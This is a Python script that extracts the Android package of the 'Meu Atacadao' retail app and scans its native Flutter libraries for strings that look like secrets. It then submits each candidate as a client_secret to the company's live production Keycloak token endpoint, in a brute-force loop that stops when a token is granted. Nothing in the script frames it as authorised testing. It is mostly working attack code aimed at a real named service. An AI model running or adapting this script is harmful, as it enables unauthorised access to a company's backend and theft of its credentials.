"""Hunt for the Keycloak client_secret of the 'Meu Atacadao' app.

Strategy: the app is a Flutter release build. Build-time dart-defines
(environments.json / --dart-define) end up as const strings inside the
AOT snapshot at lib/arm64-v8a/libapp.so. We harvest every secret-looking
literal from the native libs and probe the Keycloak token endpoint with
each candidate as `OfertaMobile-TokenAuth`.

Usage:
    python scripts/hunt_client_secret.py harvest
    python scripts/hunt_client_secret.py probe
"""
from __future__ import annotations

import json
import re
import sys
import urllib.error
import urllib.parse
import urllib.request
import zipfile
from pathlib import Path


def post_form(url: str, data: dict[str, str], timeout: int = 20) -> tuple[int, str]:
    body = urllib.parse.urlencode(data).encode()
    req = urllib.request.Request(
        url,
        data=body,
        headers={"Content-Type": "application/x-www-form-urlencoded", "Accept": "application/json"},
        method="POST",
    )
    try:
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            return resp.status, resp.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as exc:
        return exc.code, exc.read().decode("utf-8", "replace")

SPLIT0 = Path.home() / "AppData/Local/Temp/atacadao-xapk/split_0.apk"
WORK = Path("C:/Android/capture")
CANDIDATES = WORK / "secret_candidates.txt"
RESULTS = WORK / "secret_probe_results.json"

TOKEN_URLS = [
    "https://skadi-prod.portal.atacadao.com.br/realms/R-Mobile_Backend_Token-KC/protocol/openid-connect/token",
    "https://freyr.portal.atacadao.com.br/infosec/auth/v1/protocol/openid-connect/token",
]

CLIENT_IDS = ["OfertaMobile-TokenAuth"]
SCOPE = "R-OfertasMobile-externo"

# Secret-looking literals.
PATTERNS = [
    ("uuid", re.compile(rb"[0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12}")),
    ("hex32", re.compile(rb"(?<![0-9a-zA-Z])[0-9a-f]{32}(?![0-9a-zA-Z])")),
    ("hex40", re.compile(rb"(?<![0-9a-zA-Z])[0-9a-f]{40}(?![0-9a-zA-Z])")),
    ("hex64", re.compile(rb"(?<![0-9a-zA-Z])[0-9a-f]{64}(?![0-9a-zA-Z])")),
    ("b64ish", re.compile(rb"(?<![0-9A-Za-z+/_\-])[0-9A-Za-z+/_\-]{28,64}(?![0-9A-Za-z+/_\-])")),
]

NEVER_EVER = re.compile(rb"^(https?|ABCDEF|0123456789|abcdefghij|flutter|android|dart|com\.|io\.|org\.)")


def libs() -> dict[str, bytes]:
    out: dict[str, bytes] = {}
    with zipfile.ZipFile(SPLIT0) as zf:
        for name in zf.namelist():
            if name.endswith(".so"):
                out[name] = zf.read(name)
    return out


def harvest() -> None:
    WORK.mkdir(parents=True, exist_ok=True)
    found: dict[str, set[str]] = {}
    blobs = libs()

    # 1) secrets literally adjacent to the client id (dart-define blocks are
    #    often laid out back to back in the snapshot).
    for lib, blob in blobs.items():
        for m in re.finditer(rb"OfertaMobile-TokenAuth", blob):
            window = blob[max(0, m.start() - 600) : m.end() + 600]
            for s in re.findall(rb"[\x20-\x7e]{6,}", window):
                text = s.decode("ascii", "ignore")
                if re.search(r"[A-Za-z]", text) and len(text) < 120:
                    found.setdefault("near_client_id", set()).add(text)

    # 2) generic secret shapes across every native lib.
    for lib, blob in blobs.items():
        for label, pat in PATTERNS:
            for m in pat.finditer(blob):
                raw = m.group(0)
                if NEVER_EVER.match(raw):
                    continue
                found.setdefault(f"{label}:{Path(lib).name}", set()).add(raw.decode("ascii", "ignore"))

    total = sum(len(v) for v in found.values())
    print(f"libs: {len(blobs)}  candidate groups: {len(found)}  total strings: {total}")

    lines: list[str] = []
    for key, values in sorted(found.items()):
        print(f"  {key:<34} {len(values)}")
        if key.startswith("near_client_id"):
            for v in sorted(values):
                print(f"      {v!r}")
        lines.extend(sorted(values))

    CANDIDATES.write_text("\n".join(dict.fromkeys(lines)), encoding="utf-8")
    print(f"wrote {CANDIDATES} ({len(set(lines))} unique)")


def probe() -> None:
    cands = [c for c in CANDIDATES.read_text(encoding="utf-8").splitlines() if c.strip()]
    url = TOKEN_URLS[0]
    print(f"probing {len(cands)} candidates against {url}")
    hits: list[dict] = []
    for i, secret in enumerate(cands, 1):
        for client_id in CLIENT_IDS:
            data = {
                "grant_type": "client_credentials",
                "client_id": client_id,
                "client_secret": secret,
                "scope": SCOPE,
            }
            try:
                status, text = post_form(url, data)
            except Exception as exc:  # noqa: BLE001
                print(f"  [{i}] network error: {exc}")
                continue
            if status == 200:
                print(f"  *** HIT *** {client_id} / {secret!r}")
                hits.append({"client_id": client_id, "client_secret": secret, "token": json.loads(text)})
                RESULTS.write_text(json.dumps(hits, indent=2), encoding="utf-8")
                return
            if i <= 3:
                print(f"  [{i}] {status} {text[:160]}")
        if i % 50 == 0:
            print(f"  ... {i}/{len(cands)}")
    print("no hit")
    RESULTS.write_text(json.dumps(hits, indent=2), encoding="utf-8")


if __name__ == "__main__":
    (harvest if (len(sys.argv) > 1 and sys.argv[1] == "harvest") else probe)()
